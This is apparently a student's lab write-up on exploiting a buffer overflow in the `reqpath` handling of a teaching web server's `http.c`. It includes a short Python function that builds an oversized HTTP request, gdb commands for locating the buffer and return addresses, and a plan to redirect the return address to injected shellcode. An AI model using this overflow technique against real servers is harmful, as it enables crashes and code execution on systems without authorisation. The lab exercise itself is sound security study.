# Lab 1

## Part 1: Finding buffer overflows

There is one buffer overflow we can find in the `http.c`, the `reqpath`
can be overflowed.

So I write a brute-force python script:

```py
def build_exploit(shellcode):
    junk_data = b"22"
    req = b"GET " + b"/1" + junk_data * 2060 + b" HTTP/1.0\r\n\r\n"
    return req
```

## Part 2: Code injection

Instead of using brute-force ways, we should calculate carefully how many bytes
we need to inject. It is still easy.

First, we should use `gdb` to hack the web system.

```sh
b process_client
c
x/16x reqpath
info frame
```

+ `reqpath` start address is at `0x7fffffffdca0`
+ `process_client` functions return address is at `0x7fffffffecb8`

Now, it is obvious. We should set the return address to be `0x7fffffffecc0`
which is just behind the return address, and the shell code should be put in
the `0x7fffffffecc0`
